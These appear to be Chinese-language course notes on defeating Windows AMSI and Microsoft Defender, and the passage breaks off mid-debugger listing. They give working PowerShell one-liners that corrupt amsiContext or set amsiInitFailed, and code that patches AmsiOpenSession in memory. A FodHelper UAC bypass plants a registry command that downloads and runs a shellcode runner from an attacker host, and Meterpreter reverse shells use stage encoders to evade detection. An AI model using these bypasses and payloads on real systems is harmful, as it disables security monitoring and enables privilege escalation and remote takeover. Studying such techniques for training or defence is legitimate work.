PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
False    False    AmsiUtils                                System.Object

PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

PS C:\Users\Offsec> $c.GetFields('NonPublic,Static')


Name                   : amsiContext
MetadataToken          : 67114374
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.IntPtr
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}
...
```
> - `$a`: 所有 Type objects
> - `$b`: 目前迭代的 Type
> - `$c`: 找到的 AmsiUtils Type
> 
> 利用符合 `*iUtils` 的 Type，繞過字串限制

以上得知
```
Name       : amsiContext
Attributes : Private, Static
FieldType  : System.IntPtr
```

列出這個 type 裡所有 private/internal static fields
```powershell
PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static')

PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

PS C:\Users\Offsec> $f.GetValue($null)
1514420113440

0:009> dc 0x1609A791020
00000160`9a791020  49534d41 00000000 806db190 00000160  AMSI......m.`...
00000160`9a791030  8086dd30 00000160 00000022 00000000  0...`...".......
00000160`9a791040  6372756f 00007365 cf43afd2 91000300  ources....C.....
00000160`9a791050  554c4c41 53524553 464f5250 3d454c49  ALLUSERSPROFILE=
00000160`9a791060  505c3a43 72676f72 61446d61 00006174  C:\ProgramData..
00000160`9a791070  00000000 00000000 cf5eafd1 80000400  ..........^.....
00000160`9a791080  00000000 00000000 9a791080 00000160  ..........y.`...
00000160`9a791090  00000000 00000000 80000000 00000000  ................
```
> - `$d`: 所有 private static fields
> - `$e`: 每一個 field
> - `$f`: 名稱符合 `*Context` 的 FieldInfo

完整 Powershell Code:
```powershell
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes()

PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static')

PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

PS C:\Users\Offsec> $g=$f.GetValue($null)

PS C:\Users\Offsec> [IntPtr]$ptr=$g

PS C:\Users\Offsec> [Int32[]]$buf=@(0)

PS C:\Users\Offsec> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS C:\Users\Offsec> 'amsiutils'
amsiutils
```
懶人包：
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Attacking Initialization
操縱 AmsiInitialize 設定的結果變數還可以透過 `amsiInitFailed` 欄位也可以實現 AMSI bypass，最早由 Matt Graeber 於 2016 年發現
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
可以使用 Win32 API 來破壞 AMSI 函數本身

## Wrecking AMSI in PowerShell
上述使用 reflection 定位  vital structures 和 variables，一旦被破壞，就會導致 AMSI 被停用\
本節使用 binary patching 技術，直接修改 assembly instructions，可以利用這種技術對程式碼進行 hotpatch，即使資料結構有效，也能強製程式碼運行失敗

### Understanding the Assembly Flow
先了解原始程式碼的運作方式: WinDbg 匯出 AmsiOpenSession 的內容

```windbg
0:018> u amsi!AmsiOpenSession L1A
amsi!AmsiOpenSession:
00007fff`aa0824c0 4885d2          test    rdx,rdx
00007fff`aa0824c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
00007fff`aa0824c5 4885c9          test    rcx,rcx
00007fff`aa0824c8 7441            je      amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
00007fff`aa0824ca 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007fff`aa0824d0 7539            jne     amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
00007fff`aa0824d2 4883790800      cmp     qword ptr [rcx+8],0
00007fff`aa0824d7 7432            je      amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
00007fff`aa0824d9 4883791000      cmp     qword ptr [rcx+10h],0
00007fff`aa0824de 742b            je      amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
00007fff`aa0824e0 41b801000000    mov     r8d,1
00007fff`aa0824e6 418bc0          mov     eax,r8d
00007fff`aa0824e9 f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007fff`aa0824ee 4103c0          add     eax,r8d
00007fff`aa0824f1 4898            cdqe
00007fff`aa0824f3 488902          mov     qword ptr [rdx],rax
00007fff`aa0824f6 7510            jne     amsi!AmsiOpenSession+0x48 (00007fff`aa082508)
00007fff`aa0824f8 418bc0          mov     eax,r8d
00007fff`aa0824fb f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007fff`aa082500 4103c0          add     eax,r8d
00007fff`aa082503 4898            cdqe
00007fff`aa082505 488902          mov     qword ptr [rdx],rax
00007fff`aa082508 33c0            xor     eax,eax
00007fff`aa08250a c3              ret
00007fff`aa08250b b857000780      mov     eax,80070057h
00007fff`aa082510 c3              ret
```
> - `cmp dword ptr [rcx],49534D41h`: 49534D41 拆成 byte 是 `49 53 4D 41`\
> x86/x64 是 little-endian，記憶體裡實際 byte ordering 會呈現 `41 4D 53 49` (A M S I)
> 
> AmsiOpenSession 會檢查 amsiContext 開頭是不是 AMSI 的 magic/header

抽象化:
```cpp
if (amsiSession == NULL)
    return E_INVALIDARG;

if (amsiContext == NULL)
    return E_INVALIDARG;

if (amsiContext->magic != "AMSI")
    return E_INVALIDARG;

if (amsiContext->something1 == NULL)
    return E_INVALIDARG;

if (amsiContext->something2 == NULL)
    return E_INVALIDARG;
```

>[!Important]
> **改 code 前要先確認 "所有錯誤最後都走到哪裡"**\
> 很多 branch 都指向 `00007fff aa08250b`
>```
> mov eax,80070057h
>ret
>```
> 高階語言: `return 0x80070057;`


整個函式結構大概可以想成
```cpp
HRESULT AmsiOpenSession(ctx, session)
{
    if (argument invalid)
        return E_INVALIDARG;

    // initialize session
    ...

    return S_OK;
}
```
🎯: 不要改 branch，而是改 ZF\
(嘗試只修改一條 instruction，就讓後面的 JE 永遠成立)
- `XOR RAX,RAX`: 確保 ZF = 1 且新的 instruction 必須塞得進原本的位置
- `instruction size`: 若隨便塞 ?-byte instruction 會覆蓋下一條 instruction

```
AmsiOpenSession()
        │
        ▼
 TEST RDX,RDX
        │
        ▼
     ZF == 1 ?
      /     \
    Yes      No
     │        │
     ▼        ▼
 E_INVALIDARG   TEST RCX,RCX
                    │
                    ▼
                其他檢查
                    │
                    ▼
                  S_OK
```

### Patching the Internals
藉助 Win32 API，直接從 PowerShell 完成攻擊並修改 AmsiOpenSession 第一個指令

>[!NOte]
>AMSI.DLL 是已經載入到 PowerShell 行程裡的 DLL。裡面的程式碼位於 process memory 中。正常情況下，這些 code section 只能被讀取和執行，不能被寫入

需要執行三個操作:
1. 找到 AmsiOpenSession 在記憶體中的位址
2. 修改該記憶體頁面的權限，讓它可以被寫入
3. 覆寫該位址上的三個 bytes


LookupFunc 取得 Win32 API 函式位址
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

避免直接用 Add-Type 宣告 Win32 API，改用 .NET reflection 從 `Microsoft.Win32.UnsafeNativeMethods` 把 GetModuleHandle 和 GetProcAddress 拿出來用\
( 避免明顯的 Win32 API 宣告字串出現在 PowerShell 裡 )
```powershell
PS C:\Users\Offsec> function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$funcAddr
140736475571392
```
> 回傳了 AmsiOpenSession 在目前 PowerShell_ISE process 中的記憶體位址\
> [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization): Address Space Layout Randomization，每台機器、每次 process 的 addr 可能都不同

PowerShell 顯示 Decimal `140736475571392` 
```dbg
0:001> ? 0n140736475571392
Evaluate expression: 140736475571392 = 00007fff`c3a224c0
```
轉成 Hexadecimal (WinDbg 看 address 用十六進位)

利用 WinDbg 反組譯 machine code
```dbg
0:001> u 7fff`c3a224c0
amsi!AmsiOpenSession:
00007fff`c3a224c0 4885d2          test    rdx,rdx
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224c5 4885c9          test    rcx,rcx
00007fff`c3a224c8 7441            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224ca 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007fff`c3a224d0 7539            jne     amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224d2 4883790800      cmp     qword ptr [rcx+8],0
00007fff`c3a224d7 7432            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
```
> addr 真的落在`amsi!AmsiOpenSession`

>[!Note]
>DLL 的 Code Block 通常是：**"PAGE_EXECUTE_READ"**\
> 可執行可讀取 🥚不可寫入\
> 可以使用 WinDbg 的 [!vprot](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vprot) 驗證

```dbg
0:001> !vprot 7FFFC3A224C0
BaseAddress:       00007fffc3a22000
AllocationBase:    00007fffc3a20000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000008000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
```
所以必須呼叫 VirtualProtect 暫時改變該 page 的保護屬性\
目前 process 可以對這個 shared image page 產生自己的 writable private copy，而不修改其他 process 的版本\
PAGE_EXECUTE_WRITECOPY 等同於 PAGE_EXECUTE_READWRITE，但它只在 current process 使用的 private copy


>[!Note]
>[VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) Win32 API：
>```cpp
>BOOL VirtualProtect(
>  LPVOID lpAddress,
>  SIZE_T dwSize,
>  DWORD  flNewProtect,
>  PDWORD lpflOldProtect
>);
>```
>> - `lpAddress	$funcAddr`: 要改權限的記憶體位址  (AmsiOpenSession)
>> - `dwSize`: 修改的大小
>> - `flNewProtect`: 新權限 PAGE_EXECUTE_READWRITE
>> - `lpflOldProtect`: 用來存舊權限`

```
managed byte array
        │
        ▼
Marshal.Copy
        │
        ▼
unmanaged process memory
        │
        ▼
AmsiOpenSession
```
使用 System.Runtime.InteropServices namespace 的 [Copy](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8) method，將 `48 85 D2` `test rdx,rdx` 改為 `48 31 C0` `xor rax,rax`
```powershell
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
```
> xor rax,rax

以上操作可能會在使用後立即停用 AMSI，所以需要恢復原有的記憶體保護來掩蓋操作痕跡\
再次使用 VirtualProtect，並指定先前的記憶體保護值 0x20
```powershell
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
> 完成 patch 後，把 memory protection 恢復回原本的狀態


用 WinDbg 驗證
```Dbg
0:001> u 7FFFC3A224C0
amsi!AmsiOpenSession:
00007fff`c3a224c0 4831c0          xor     rax,rax
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224c5 4885c9          test    rcx,rcx
00007fff`c3a224c8 7441            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224ca 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007fff`c3a224d0 7539            jne     amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
00007fff`c3a224d2 4883790800      cmp     qword ptr [rcx+8],0

0:001> !vprot 7FFFC3A224C0
BaseAddress:       00007fffc3a22000
AllocationBase:    00007fffc3a20000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000008000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
```
> 成功覆蓋：
> ```
> amsi!AmsiOpenSession:
>00007fff`c3a224c0 4831c0 xor rax,rax
> ```

輸入 amsiutils 嘗試觸發 AMSI
```powershell
PS C:\Users\Offsec> 'amsiutils'
amsiutils
```
> AMSI 已被停用

## UAC Bypass vs Microsoft Defender
透過 UAC bypass 建立一個新的且 High Integrity 的 PowerShell process，但 Microsoft Defender / AMSI 會阻擋
```
低權限 / Medium Integrity
        │
        │ UAC Bypass
        ▼
High Integrity Process
        │
        │ PowerShell
        ▼
     AMSI 掃描
        │
        ▼
Microsoft Defender
```
### FodHelper UAC Bypass
Windows 10 Fodhelper.exe application UAC Bypass 在 [2017](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) 發現

>[!note]
>`fodhelper.exe` 是 Windows 10 引入的系統程式，用來管理一些 Optional Features，例如區域性的鍵盤設定\
>原廠指出這個程式：`runs as high integrity`

1. 理解 Integrity Level
Windows 可以用 Integrity Level 區分 process 的權限層級
Low ▶️ Medium  ▶️ High ▶️ System

一般 UAC 開啟的 Windows 管理員帳號，平常操作通常不是直接拿著 High Integrity token 工作
嘗試利用一個本身會以 High Integrity 執行的 Windows 元件，讓它替我們建立新的 process

2. 為什麼是 FodHelper?
Windows 指出 fodhelper.exe 會以 High Integrity 執行，可嘗試利用 Windows Registry

>[!Note]
>```
>HKCU:\Software\Classes\ms-settings\shell\open\command
>```
>HKCU 是 HKEY_CURRENT_USER\
>目前登入的使用者通常可以修改自己的 HKCU，因此攻擊者不需要 Administrator 就能修改這個 registry location
>```
>使用者可以修改 Registry
>        ↓
>FodHelper 會讀取該 Registry
>        ↓
>FodHelper 本身以 High Integrity 執行
>        ↓
>Registry 控制它啟動什麼
>        ↓
>可能造成 privilege boundary crossing
>```

Registry path 中的 ms-settings 是一種 Windows shell / URI handling 的關聯。FodHelper 在處理相關功能時會查找這個 registry path。\
Windows 預設不會有這個 registry key，因此 PoC 的第一步就是建立

透過 New-Item 建立 Registry path 並設定 Default value:
```powershell
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
```
在上面建立的 key 中建立一個 Registry value：
```powershell
PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```
執行 FodHelper
```powershell
PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe

① 修改 HKCU Registry
        │
        ▼
② 建立 ms-settings handler
        │
        ▼
③ 設定 Default = powershell.exe
        │
        ▼
④ 設定 DelegateExecute
        │
        ▼
⑤ 執行 fodhelper.exe
        │
        ▼
⑥ FodHelper 讀 Registry
        │
        ▼
⑦ 建立 PowerShell process
```
![image](https://hackmd.io/_uploads/HyozMiP5zg.png)

3. Metasploit 也有這個模組
選擇 `exploit/windows/local/bypassuac_fodhelper`
```bash
msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper

msf5 exploit(windows/local/bypassuac_fodhelper) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64


msf5 exploit(windows/local/bypassuac_fodhelper) > set target 1
target => 1

msf5 exploit(windows/local/bypassuac_fodhelper) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x64/windows  victim\Offsec @ victim  192.168.119.120:443 -> 192.168.120.11:51474 (192.168.120.11)

msf5 exploit(windows/local/bypassuac_fodhelper) > set session 1
session => 1

msf5 exploit(windows/local/bypassuac_fodhelper) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf5 exploit(windows/local/bypassuac_fodhelper) > set lhost 192.168.119.120
lhost => 192.168.119.120
msf5 exploit(windows/local/bypassuac_fodhelper) > set lport 444
lport => 444
msf5 exploit(windows/local/bypassuac_fodhelper) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.
[-] exploit: Interrupted
```
> `[-] Exploit failed` 可以看出 Administrator membership ≠ UAC bypass 一定成功
> 微軟有另一個安全機制是 Microsoft Defender + AMSI\
> ![image](https://hackmd.io/_uploads/ByGj7oPqfe.png)

分析阻擋流程：
```
UAC bypass
        │
        ▼
PowerShell component
        │
        ▼
AMSI
        │
        ▼
Microsoft Defender
        │
        ▼
Detection
        │
        ▼
Payload blocked
```
UAC Bypass 成功，但 Payload 被擋

###  Improving Fodhelper
雖然 FodHelper UAC Bypass 成功，但遇到 Microsoft Defender + AMSI 後，Metasploit 預設的 FodHelper module 會被偵測

🧠： PowerShell script 容易被 AMSI 發現，嘗試把 AMSI bypass 放進 Registry\
Registry value 本身的長度只會受系統可用記憶體的限制，可以容納相當大量的資料：
- Registry key name：最多 255 characters
- Registry value name：最多 16383 characters
- Registry value 本身：主要受到系統可用記憶體限制

利用前幾章提到的 shellcode runner 建立 run.txt

修改 UAC 繞過 PowerShell 指令，利用 IEX (Invoke-Expression)把取得的字串當成 PowerShell expression 執行
```powershell
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
```

Meterpreter
```bash
msf5 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: urhro5fl) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.11:50345) at 2019-10-31 08:05:44 -0400
```
![image](https://hackmd.io/_uploads/HkVKwovcMe.png)

嘗試使用 x64/zutto_dekiru (若失敗也可以嘗試 x64/xor_dynamic)
```bash
...
msf5 exploit(multi/handler) > set EnableStageEncoding true 
EnableStageEncoding => true

msf5 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
StageEncoder => x64/zutto_dekiru

msf5 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: ukslgwmw) Encoded stage with x64/zutto_dekiru
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: ukslgwmw) Staging x64 payload (207506 bytes) ...
[*] Meterpreter session 3 opened (192.168.119.120:443 -> 192.168.120.11:50350)

meterpreter > shell
Process 5796 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                            Type             SID          Attributes                                                     
===================================== ================ ============ ==================
...

NT AUTHORITY\NTLM Authentication      Well-known group S-1-5-64-10  Mandatory group, E             
Mandatory Label\High Mandatory Level  Label            S-1-16-12288  
```
> Meterpreter 使用 staged payload 代表 payload 不是一次全部傳送
> 1. Stage 1: 建立連線 / loader
> 2. Stage 2: 大型 Meterpreter payload

## Bypassing AMSI in JScript
理解 JScript 與 AMSI 的互動

### Detecting the AMSI API Flow
利用 Frida 先做動態分析
```JScript
WScript.Sleep(20000);

var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("calc")
```
Frida 分析：
- `-p 708`	attach 到 PID 708
- `-x amsi.dll`	對指定 DLL 做 tracing
- `-i Amsi*`	尋找名稱符合 Amsi* 的函式
```powershell
C:\Users\Offsec> frida-trace -p 708 -x amsi.dll -i Amsi*
Instrumenting functions...
AmsiOpenSession: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js"
AmsiUninitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js"
AmsiScanBuffer: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js"
AmsiUacInitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js"
AmsiInitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js"
AmsiCloseSession: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js"
AmsiScanString: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js"
AmsiUacUninitialize: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js"
AmsiUacScan: Loaded handler at "C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js"
Started tracing 9 functions. Press Ctrl+C to stop.
           /* TID 0x144c */
 12118 ms  AmsiScanString()
 12118 ms     | [*] AmsiScanBuffer()
 12118 ms     | |- amsiContext: 0x28728e17c80
 12118 ms     | |- buffer: IHost.Sleep("20000");
IWshShell3.Run("calc");

 12118 ms     | |- length: 0x60
 12118 ms     | |- contentName 0x28728e35f08
 12118 ms     | |- amsiSession 0x0
 12118 ms     | |- result 0xf97dafdc00

 12128 ms     | [*] AmsiScanBuffer() Exit
 12128 ms     | |- Result value is: 1

 12181 ms  AmsiUninitialize()
Process terminated
```
> Frida 最後 tracing 了 9 個函式 AmsiOpenSession, AmsiUninitialize, AmsiScanBuffer, AmsiUacInitialize, AmsiInitialize, AmsiCloseSession, AmsiScanString, AmsiUacUninitialize, AmsiUacScan\
>> AmsiScanString 和 AmsiScanBuffer 被調用，但 AmsiOpenSession沒有被調用: 因為 JScript 處理每個 command 時使用單一 session，而 PowerShell 則是每個 command 使用不同 session

嘗試使用前幾章節的手法測試 DotNetToJscript shellcode runner 
```
C# Shellcode Runner
       ↓
Managed DLL
       ↓
DotNetToJscript
       ↓
JScript
       ↓
wscript.exe
```
Frida 分析：
```powershell
         /* TID 0x690 */
  7667 ms  AmsiScanString()
  7667 ms     | [*] AmsiScanBuffer()
  7667 ms     | |- amsiContext: 0x26e81c079d0
  7667 ms     | |- buffer: IHost.Sleep("20000");
IWshShell3.Environment("Process");
IWshEnvironment.Item("COMPLUS_Version", "v4.0.30319");
_ASCIIEncoding._6002000f("AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb2");
_ASCIIEncoding._60020014("AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb2");
_FromBase64Transform._60020009("Unsupported parameter type 00002011", "0", "9924");
_MemoryStream._60020017("Unsupported parameter type 00002011", "0", "7443");
_MemoryStream._6002000b("0");
_BinaryFormatter._60020006("Unsupported parameter type 00000009");
_ArrayList._60020020("Unsupported parameter type 00000000");
_ArrayList._6002001b();
_HeaderHandler._60020007("Unsupported parameter type 0000200c");

  7667 ms     | |- length: 0x818
  7667 ms     | |- contentName 0x26e9c8f6918
  7667 ms     | |- amsiSession 0x0
  7667 ms     | |- result 0xd9cedfdd20

  7717 ms     | [*] AmsiScanBuffer() Exit
  7717 ms     | |- Result value is: 32768

  7720 ms  AmsiUninitialize()
```
> `32768` 代表 Windows Defender 將這段程式碼標記為 malicious XDD

### Is That Your Registry Key?
🎯： 從 Registry 設定讓 JScript 不啟用 AMSI

使用 DotNetToJscript payload 時，需要先 bypass AMSI。🥚 PowerShell 的 bypass 使用 reflection 或 Win32 API，而這些技術在 JScript 中不可直接使用
PowerShell | JScript |
:------|:--------|
可以利用 .NET reflection | 這種方式不能直接照搬 
可以透過 Win32 API 操作 AMSI | JScript 本身沒有相同的使用方式
可以修改 AmsiOpenSession  | JScript 需要尋找自己的 AMSI 初始化流程

Security researcher [@Tal_Liberman](https://x.com/Tal_Liberman) 發現 JScript 在初始化 AMSI 之前，會從目前使用者的 HKCU Registry 查詢 AmsiEnable，且如果 AmsiEnable 值是 0 代表 JScript process 不會啟用 AMSI

>[!Tip]
>Registry 查詢發生在 `JAmsi::JAmsiIsEnabledByRegistry` function 位於 `Jscript.dll`，且只在 wscript.exe 啟動時呼叫

開啟 WinDbg  File -> Open Executable... 選擇 wscript.exe
![image](https://hackmd.io/_uploads/S10Wx3P9Mg.png)

`bu` Unresolved Breakpoint 當前 module 還沒載入沒關係，先記住這個 symbol，等 module 載入後再自動設定 breakpoint\
(因為 jscript.dll 在設定 breakpoint 時尚未載入，所以不能使用 bp)
```dbg
0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry

0:000> g
ModLoad: 00007fff`d3350000 00007fff`d337e000   C:\Windows\System32\IMM32.DLL
ModLoad: 00007fff`cf4d0000 00007fff`cf4e1000   C:\Windows\System32\kernel.appcore.dll
ModLoad: 00007fff`cdad0000 00007fff`cdb6c000   C:\Windows\system32\uxtheme.dll
ModLoad: 00007fff`cf280000 00007fff`cf31b000   C:\Windows\SYSTEM32\sxs.dll
ModLoad: 00007fff`d2700000 00007fff`d286a000   C:\Windows\System32\MSCTF.dll
ModLoad: 00007fff`cdee0000 00007fff`cdf0e000   C:\Windows\system32\dwmapi.dll
ModLoad: 00007fff`d01b0000 00007fff`d038b000   C:\Windows\System32\CRYPT32.dll
ModLoad: 00007fff`cf4b0000 00007fff`cf4c2000   C:\Windows\System32\MSASN1.dll
ModLoad: 00007fff`cfd80000 00007fff`cfd97000   C:\Windows\System32\CRYPTSP.dll
ModLoad: 00007fff`d2b00000 00007fff`d2ba2000   C:\Windows\System32\clbcatq.dll
ModLoad: 00007fff`a3a70000 00007fff`a3b41000   C:\Windows\System32\jscript.dll
ModLoad: 00007fff`d3000000 00007fff`d3052000   C:\Windows\System32\SHLWAPI.dll
Breakpoint 0 hit
jscript!JAmsi::JAmsiIsEnabledByRegistry:
00007fff`a3a868c4 48894c2408      mov     qword ptr [rsp+8],rcx ss:000000e5`933bcfc0=000000e5933bd098
```
查看目前 RIP 開始往後的 20 行 assembly
```dbg
0:000> u rip L20
jscript!JAmsi::JAmsiIsEnabledByRegistry:
00007fff`a3a868c4 48894c2408      mov     qword ptr [rsp+8],rcx
00007fff`a3a868c9 53              push    rbx
00007fff`a3a868ca 4883ec30        sub     rsp,30h
00007fff`a3a868ce 8b05183e0a00    mov     eax,dword ptr [jscript!g_AmsiEnabled (00007fff`a3b2a6ec)]
00007fff`a3a868d4 85c0            test    eax,eax
00007fff`a3a868d6 0f8480000000    je      jscript!JAmsi::JAmsiIsEnabledByRegistry+0x98 (00007fff`a3a8695c)
00007fff`a3a868dc 7f76            jg      jscript!JAmsi::JAmsiIsEnabledByRegistry+0x90 (00007fff`a3a86954)
00007fff`a3a868de 488d442458      lea     rax,[rsp+58h]
00007fff`a3a868e3 41b919000200    mov     r9d,20019h
00007fff`a3a868e9 4533c0          xor     r8d,r8d
00007fff`a3a868ec 4889442420      mov     qword ptr [rsp+20h],rax
00007fff`a3a868f1 488d15e8cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134e0)]
00007fff`a3a868f8 48c7c101000080  mov     rcx,0FFFFFFFF80000001h
00007fff`a3a868ff ff15f3a60800    call    qword ptr [jscript!_imp_RegOpenKeyExW (00007fff`a3b10ff8)]
